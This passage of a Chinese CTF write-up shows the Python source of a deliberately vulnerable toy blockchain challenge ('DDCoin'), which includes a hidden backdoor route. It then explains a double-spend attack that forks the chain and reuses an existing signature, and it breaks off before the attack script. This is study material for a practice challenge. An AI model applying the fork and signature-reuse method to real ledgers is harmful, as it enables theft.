hexed = hex(pubkey.n)</span><br><span class="line">    <span class="keyword">if</span> hexed.endswith(<span class="string">'L'</span>): hexed = hexed[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> hexed.startswith(<span class="string">'0x'</span>): hexed = hexed[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> hexed</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_addr_key_pair</span><span class="params">()</span>:</span></span><br><span class="line">    pubkey, privkey = rsa.newkeys(<span class="number">384</span>)</span><br><span class="line">    <span class="keyword">return</span> pubkey_to_address(pubkey), privkey</span><br><span class="line"></span><br><span class="line">bank_address, bank_privkey = gen_addr_key_pair()</span><br><span class="line">hacker_address, hacker_privkey = gen_addr_key_pair()</span><br><span class="line">shop_address, shop_privkey = gen_addr_key_pair()</span><br><span class="line">shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_input_utxo</span><span class="params">(input_utxo_id, privkey)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> rsa.sign(input_utxo_id, privkey, <span class="string">'SHA-1'</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span><span class="params">(utxo)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">'id'</span>], utxo[<span class="string">'addr'</span>], str(utxo[<span class="string">'amount'</span>])])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_output_utxo</span><span class="params">(addr_to, amount)</span>:</span></span><br><span class="line">    utxo = &#123;<span class="string">'id'</span>: str(uuid.uuid4()), <span class="string">'addr'</span>: addr_to, <span class="string">'amount'</span>: amount&#125;</span><br><span class="line">    utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</span><br><span class="line">    <span class="keyword">return</span> utxo</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span><span class="params">(tx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</span><br><span class="line">        reduce(hash_reducer, tx[<span class="string">'input'</span>], EMPTY_HASH),</span><br><span class="line">        reduce(hash_reducer, [utxo[<span class="string">'hash'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]], EMPTY_HASH)</span><br><span class="line">    ])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx</span><span class="params">(input_utxo_ids, output_utxo, privkey_from=None)</span>:</span></span><br><span class="line">    tx = &#123;<span class="string">'input'</span>: input_utxo_ids, <span class="string">'signature'</span>: [sign_input_utxo(id, privkey_from) <span class="keyword">for</span> id <span class="keyword">in</span> input_utxo_ids], <span class="string">'output'</span>: output_utxo&#125;</span><br><span class="line">    tx[<span class="string">'hash'</span>] = hash_tx(tx)</span><br><span class="line">    <span class="keyword">return</span> tx</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], reduce(hash_reducer, [tx[<span class="string">'hash'</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]], EMPTY_HASH)])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span><span class="params">(prev_block_hash, nonce_str, transactions)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">'prev_block_hash should be hex-encoded hash value'</span>)</span><br><span class="line">    nonce = str(nonce_str)</span><br><span class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">'the nonce is too long'</span>)</span><br><span class="line">    block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</span><br><span class="line">    block[<span class="string">'hash'</span>] = hash_block(block)</span><br><span class="line">    <span class="keyword">return</span> block</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_blockchain_tail</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> max(session[<span class="string">'blocks'</span>].values(), key=<span class="keyword">lambda</span> block: block[<span class="string">'height'</span>])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_utxo</span><span class="params">(blockchain_tail)</span>:</span></span><br><span class="line">    curr_block = blockchain_tail</span><br><span class="line">    blockchain = [curr_block]</span><br><span class="line">    <span class="keyword">while</span> curr_block[<span class="string">'hash'</span>] != session[<span class="string">'genesis_block_hash'</span>]:</span><br><span class="line">        curr_block = session[<span class="string">'blocks'</span>][curr_block[<span class="string">'prev'</span>]]</span><br><span class="line">        blockchain.append(curr_block)</span><br><span class="line">    blockchain = blockchain[::<span class="number">-1</span>]</span><br><span class="line">    utxos = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blockchain:</span><br><span class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</span><br><span class="line">            <span class="keyword">for</span> input_utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</span><br><span class="line">                <span class="keyword">del</span> utxos[input_utxo_id]</span><br><span class="line">            <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</span><br><span class="line">                utxos[utxo[<span class="string">'id'</span>]] = utxo</span><br><span class="line">    <span class="keyword">return</span> utxos</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_balance</span><span class="params">(utxos)</span>:</span></span><br><span class="line">    balance = &#123;bank_address: <span class="number">0</span>, hacker_address: <span class="number">0</span>, shop_address: <span class="number">0</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</span><br><span class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] <span class="keyword">not</span> <span class="keyword">in</span> balance:</span><br><span class="line">            balance[utxo[<span class="string">'addr'</span>]] = <span class="number">0</span></span><br><span class="line">        balance[utxo[<span class="string">'addr'</span>]] += utxo[<span class="string">'amount'</span>]</span><br><span class="line">    <span class="keyword">return</span> balance</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_utxo_signature</span><span class="params">(address, utxo_id, signature)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> rsa.verify(utxo_id, signature.decode(<span class="string">'hex'</span>), addr_to_pubkey(address))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_block</span><span class="params">(block, difficulty=int<span class="params">(<span class="string">'f'</span>*<span class="number">64</span>, <span class="number">16</span>)</span>)</span>:</span></span><br><span class="line">    has_attrs(block, [<span class="string">'prev'</span>, <span class="string">'nonce'</span>, <span class="string">'transactions'</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'prev'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'prev'</span>] = str(block[<span class="string">'prev'</span>])</span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'nonce'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'nonce'</span>] = str(block[<span class="string">'nonce'</span>])</span><br><span class="line">    <span class="keyword">if</span> block[<span class="string">'prev'</span>] <span class="keyword">not</span> <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">"unknown parent block"</span>)</span><br><span class="line">    tail = session[<span class="string">'blocks'</span>][block[<span class="string">'prev'</span>]]</span><br><span class="line">    utxos = calculate_utxo(tail)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'transactions'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">'Please put a transaction array in the block'</span>)</span><br><span class="line">    new_utxo_ids = set()</span><br><span class="line">    <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</span><br><span class="line">        has_attrs(tx, [<span class="string">'input'</span>, <span class="string">'output'</span>, <span class="string">'signature'</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</span><br><span class="line">            has_attrs(utxo, [<span class="string">'amount'</span>, <span class="string">'addr'</span>, <span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'id'</span>] = str(utxo[<span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'addr'</span>] = str(utxo[<span class="string">'addr'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo[<span class="string">'id'</span>] <span class="keyword">in</span> new_utxo_ids: <span class="keyword">raise</span> Exception(<span class="string">"output utxo of same id(&#123;&#125;) already exists."</span>.format(utxo[<span class="string">'id'</span>]))</span><br><span class="line">            new_utxo_ids.add(utxo[<span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'amount'</span>]) != type(<span class="number">1</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of amount of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo[<span class="string">'amount'</span>] &lt;= <span class="number">0</span>: <span class="keyword">raise</span> Exception(<span class="string">"invalid amount of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of address of output utxo"</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                addr_to_pubkey(utxo[<span class="string">'addr'</span>])</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"invalid type of address(&#123;&#125;)"</span>.format(utxo[<span class="string">'addr'</span>]))</span><br><span class="line">            utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</span><br><span class="line">        tot_output = sum([utxo[<span class="string">'amount'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> type(tx[<span class="string">'input'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo ids in tx should be array"</span>)</span><br><span class="line">        <span class="keyword">if</span> type(tx[<span class="string">'signature'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo signatures in tx should be array"</span>)</span><br><span class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) != len(tx[<span class="string">'signature'</span>]): <span class="keyword">raise</span> Exception(<span class="string">"lengths of arrays of ids and signatures of input utxos should be the same"</span>)</span><br><span class="line">        tot_input = <span class="number">0</span></span><br><span class="line">        tx[<span class="string">'input'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'input'</span>]]</span><br><span class="line">        tx[<span class="string">'signature'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'signature'</span>]]</span><br><span class="line">        <span class="keyword">for</span> utxo_id, signature <span class="keyword">in</span> zip(tx[<span class="string">'input'</span>], tx[<span class="string">'signature'</span>]):</span><br><span class="line">            <span class="keyword">if</span> type(utxo_id) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of input utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo_id <span class="keyword">not</span> <span class="keyword">in</span> utxos: <span class="keyword">raise</span> Exception(<span class="string">"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed."</span>.format(utxo_id))</span><br><span class="line">            utxo = utxos[utxo_id]</span><br><span class="line">            <span class="keyword">if</span> type(signature) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of signature of input utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> verify_utxo_signature(utxo[<span class="string">'addr'</span>], utxo_id, signature):</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!"</span>.format(utxo_id))</span><br><span class="line">            tot_input += utxo[<span class="string">'amount'</span>]</span><br><span class="line">            <span class="keyword">del</span> utxos[utxo_id]</span><br><span class="line">        <span class="keyword">if</span> tot_output &gt; tot_input:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;"</span>.format(tot_input, tot_output))</span><br><span class="line">        tx[<span class="string">'hash'</span>] = hash_tx(tx)</span><br><span class="line">    </span><br><span class="line">    block = create_block(block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], block[<span class="string">'transactions'</span>])</span><br><span class="line">    block_hash = int(block[<span class="string">'hash'</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">'Please provide a valid Proof-of-Work'</span>)</span><br><span class="line">    block[<span class="string">'height'</span>] = tail[<span class="string">'height'</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'blocks'</span>]) &gt; <span class="number">50</span>: <span class="keyword">raise</span> Exception(<span class="string">'The blockchain is too long. Use ./reset to reset the blockchain'</span>)</span><br><span class="line">    <span class="keyword">if</span> block[<span class="string">'hash'</span>] <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">'A same block is already in the blockchain'</span>)</span><br><span class="line">    session[<span class="string">'blocks'</span>][block[<span class="string">'hash'</span>]] = block</span><br><span class="line">    session.modified = <span class="keyword">True</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'blocks'</span>] = &#123;&#125;</span><br><span class="line">        session[<span class="string">'your_diamonds'</span>] = <span class="number">0</span></span><br><span class="line">        <span class="comment"># First, the bank issued some DDCoins ...</span></span><br><span class="line">        total_currency_issued = create_output_utxo(bank_address, <span class="number">1000000</span>)</span><br><span class="line">        genesis_transaction = create_tx([], [total_currency_issued]) <span class="comment"># create DDCoins from nothing</span></span><br><span class="line">        genesis_block = create_block(EMPTY_HASH, <span class="string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span>, [genesis_transaction])</span><br><span class="line">        session[<span class="string">'genesis_block_hash'</span>] = genesis_block[<span class="string">'hash'</span>]</span><br><span class="line">        genesis_block[<span class="string">'height'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'blocks'</span>][genesis_block[<span class="string">'hash'</span>]] = genesis_block</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># Then, the bank was hacked by the hacker ...</span></span><br><span class="line">        handout = create_output_utxo(hacker_address, <span class="number">999999</span>)</span><br><span class="line">        reserved = create_output_utxo(bank_address, <span class="number">1</span>)</span><br><span class="line">        transferred = create_tx([total_currency_issued[<span class="string">'id'</span>]], [handout, reserved], bank_privkey)</span><br><span class="line">        second_block = create_block(genesis_block[<span class="string">'hash'</span>], <span class="string">'HAHA, I AM THE BANK NOW!'</span>, [transferred])</span><br><span class="line">        append_block(second_block)</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># Can you buy 2 diamonds using all DDCoins?</span></span><br><span class="line">        third_block = create_block(second_block[<span class="string">'hash'</span>], <span class="string">'a empty block'</span>, [])</span><br><span class="line">        append_block(third_block)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    tail = find_blockchain_tail()</span><br><span class="line">    utxos = calculate_utxo(tail)</span><br><span class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></span><br><span class="line">    announcement = <span class="string">'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '</span></span><br><span class="line">    balance, utxos, _ = get_balance_of_all()</span><br><span class="line">    genesis_block_info = <span class="string">'hash of genesis block: '</span> + session[<span class="string">'genesis_block_hash'</span>]</span><br><span class="line">    addr_info = <span class="string">'the bank\'s addr: '</span> + bank_address + <span class="string">', the hacker\'s addr: '</span> + hacker_address + <span class="string">', the shop\'s addr: '</span> + shop_address</span><br><span class="line">    balance_info = <span class="string">'Balance of all addresses: '</span> + json.dumps(balance)</span><br><span class="line">    utxo_info = <span class="string">'All utxos: '</span> + json.dumps(utxos)</span><br><span class="line">    blockchain_info = <span class="string">'Blockchain Explorer: '</span> + json.dumps(session[<span class="string">'blocks'</span>])</span><br><span class="line">    view_source_code_link = <span class="string">"&lt;a href='source_code'&gt;View source code&lt;/a&gt;"</span></span><br><span class="line">    <span class="keyword">return</span> announcement+(<span class="string">'&lt;br /&gt;&lt;br /&gt;\r\n\r\n'</span>.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info]))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'your_diamonds'</span>] &gt;= <span class="number">2</span>: <span class="keyword">return</span> FLAG()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span>.format(session[<span class="string">'your_diamonds'</span>]) + shop_address</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_enough_utxos</span><span class="params">(utxos, addr_from, amount)</span>:</span></span><br><span class="line">    collected = []</span><br><span class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</span><br><span class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == addr_from:</span><br><span class="line">            amount -= utxo[<span class="string">'amount'</span>]</span><br><span class="line">            collected.append(utxo[<span class="string">'id'</span>])</span><br><span class="line">        <span class="keyword">if</span> amount &lt;= <span class="number">0</span>: <span class="keyword">return</span> collected, -amount</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'no enough DDCoins in '</span> + addr_from)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(utxos, addr_from, addr_to, amount, privkey)</span>:</span></span><br><span class="line">    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)</span><br><span class="line">    outputs = [create_output_utxo(addr_to, amount)]</span><br><span class="line">    <span class="keyword">if</span> the_change != <span class="number">0</span>:</span><br><span class="line">        outputs.append(create_output_utxo(addr_from, the_change))</span><br><span class="line">    <span class="keyword">return</span> create_tx(input_utxo_ids, outputs, privkey)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_ddcoin</span><span class="params">(address)</span>:</span></span><br><span class="line">    balance, utxos, tail = get_balance_of_all()</span><br><span class="line">    <span class="keyword">if</span> balance[bank_address] == <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'The bank has no money now.'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        address = str(address)</span><br><span class="line">        addr_to_pubkey(address) <span class="comment"># to check if it is a valid address</span></span><br><span class="line">        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)</span><br><span class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'b@cKd00R tr1993ReD'</span>, [transferred])</span><br><span class="line">        append_block(new_block)</span><br><span class="line">        <span class="keyword">return</span> str(balance[bank_address]) + <span class="string">' DDCoins are successfully sent to '</span> + address</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'ERROR: '</span> + str(e)</span><br><span class="line"></span><br><span class="line">DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)</span><br><span class="line"><span class="meta">@app.route(url_prefix+'/create_transaction', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        block = json.loads(request.data)</span><br><span class="line">        append_block(block, DIFFICULTY)</span><br><span class="line">        msg = <span class="string">'transaction finished.'</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">return</span> str(e)</span><br><span class="line">        </span><br><span class="line">    balance, utxos, tail = get_balance_of_all()</span><br><span class="line">    <span class="keyword">if</span> balance[shop_address] == <span class="number">1000000</span>:</span><br><span class="line">        <span class="comment"># when 1000000 DDCoins are received, the shop will give you a diamond</span></span><br><span class="line">        session[<span class="string">'your_diamonds'</span>] += <span class="number">1</span></span><br><span class="line">        <span class="comment"># and immediately the shop will store the money somewhere safe.</span></span><br><span class="line">        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)</span><br><span class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'save the DDCoins in a cold wallet'</span>, [transferred])</span><br><span class="line">        append_block(new_block)</span><br><span class="line">        msg += <span class="string">' You receive a diamond.'</span></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line"><span class="comment"># if you mess up the blockchain, use this to reset the blockchain.</span></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/reset')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_blockchain</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'blocks'</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'genesis_block_hash'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'genesis_block_hash'</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'reset.'</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/source_code')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source_code</span><span class="params">()</span>:</span></span><br><span class="line">    source = open(<span class="string">'serve.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">        html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">    source.close()</span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
+<p>在source code 中可以发现几个接口</p>
+<ul>
+<li><code>\source_code</code>：查看源码</li>
+<li><code>\reset</code>：重置记录</li>
+<li><code>\create_transaction</code>：接受post参数，创造一笔新的交易，并且检查商店的钱包中如果存在100w，则可以消耗100w得到一个钻石</li>
+<li><code>\5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;</code>：把银行剩余财产转移到指定账户</li>
+<li><code>\flag</code>：如果钻石个数大于等于两个，打印flag</li>
+<li>根目录：打印基本信息</li>
+</ul>
+<p>sourcecode中的一些关键函数</p>
+<p><strong>构造</strong></p>
+<p><strong>create_output_utxo</strong></p>
+<ul>
+<li>输入：余额钱包地址，剩余金额</li>
+<li>返回：utxo数据块</li>
+</ul>
+<p><strong>create_tx</strong></p>
+<ul>
+<li>输入：付款钱包utxo的id，收款钱包的utxo数据块，付款方的私钥</li>
+<li>返回：tx(交易)数据块</li>
+</ul>
+<p><strong>create_block</strong></p>
+<ul>
+<li>输入：前一个区块的hash，调和参数nonce，tx数据块</li>
+<li>返回：一个区块</li>
+<li></li>
+</ul>
+<p><strong>交易</strong></p>
+<p><strong>transfer</strong></p>
+<ul>
+<li>输入：全部utxo，付款地址，收款地址，金额</li>
+<li>返回：tx数据块</li>
+</ul>
+<p><strong>append_block</strong></p>
+<ul>
+<li>输入：区块，难度系数</li>
+<li>返回：交易成功或者失败</li>
+</ul>
+<p><strong>校验</strong></p>
+<p><strong>find_blockchain_tail</strong></p>
+<ul>
+<li>输入：无</li>
+<li>返回：当前区块链中height值最高的块，即尾块</li>
+</ul>
+<p><strong>calculate_utxo</strong></p>
+<ul>
+<li>输入：区块链的尾块</li>
+<li>返回：由尾块向上计算到创世块生成的全部utxo</li>
+</ul>
+<p><strong>calculate_balance</strong></p>
+<ul>
+<li>输入：全部utxo</li>
+<li>返回：一个地址对应余额的字典</li>
+</ul>
+<p><strong>get_balance_of_all</strong></p>
+<ul>
+<li>输入：无</li>
+<li>返回：余额字典，全部utxo，尾块</li>
+</ul>
+<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>在这个区块链中，我们的余额每次通过get_balance_of_all()计算得到，这个函数会依次调用find_blockchain_tail()和calculate_utxo()，来重新由头去尾生成一个新的余额字典，</p>
+<p>find_blockchain_tail()认为区块中height值最高的区块为尾块。而每个区块中的height值，由append_block()添加，这个函数会根据区块的前项hash，令本项区块的height为前一项区块的height值+1，由于append_block()并没有校验或者禁止多个区块的前项hash指向同一个区块，所以在整个区块链中是可以存在支链的。计算余额时就要以最长链为主。在这个题目中，如果两条支链长度相同，计算余额时会随机选取一个链，我们这里要构造双花攻击时，为了确保成功，构造的假链最好要比原始主链大一。</p>
+<p>程序出事的区块链为：</p>
+<p>创世块-&gt;黑客块-&gt;空块</p>
+<p><strong>构造方法一</strong></p>
+<p>这种办法只要POST空块即可，转账使用转账后门实现：</p>
+<p><img src="/2020/01/11/攻防世界web/2.png" alt="2"></p>
+<ul>
+<li>当POST第三个空块时，主链改变，黑客提走的钱被追回，通过转账后门与POST触发新增两个区块，总长为六块</li>
+<li>接上第三个空块，POST到第六个空块时，主链再次改变，钱又重新回到银行，再次利用后门得到钻石</li>
+</ul>
+<p><strong>构造方法二</strong></p>
+<p><img src="/2020/01/11/攻防世界web/3.png" alt="3"></p>
+<ul>
+<li>伪造具有一个银行转给商店的交易记录的区块，这里要伪造tx数据块中的签名</li>
+<li>签名是通过tx数据库中的input（付款utxo的id）和付款方的私钥算出</li>
+<li>所以直接利用黑客块中的签名即可</li>
+<li>当POST到第三块时，主链改变，100w在商店余额中，自动触发购买钻石</li>
+<li>接上第三块，POST到第五块时主链再猜改变，自动触发购买钻石</li>
+</ul>
+<h4 id="攻击脚本"><a href="#攻击脚本" class="headerlink" title="攻击脚本"></a>攻击脚本</h4><p>这里我们采取攻击思路二，通过分析init函数，可见一般构造一个区块要通过三个步骤：</p>
+<ul>
+<li>reate_output_utxo：生成转出的utxo数据块，以及自己剩余的utxo数据块</li>
+<li>create_tx：通过上两个utxo数据块以及付款钱包的utxo中的id和私钥生成transactions数据块（id和私钥一起计算签名）</li>
+<li>create_block：利用生成的transaction数据，前一块的hash，以及nonce生成一块符合标准区块</li>
+</ul>
+<p>通过三个API构造出如下函数：</p>
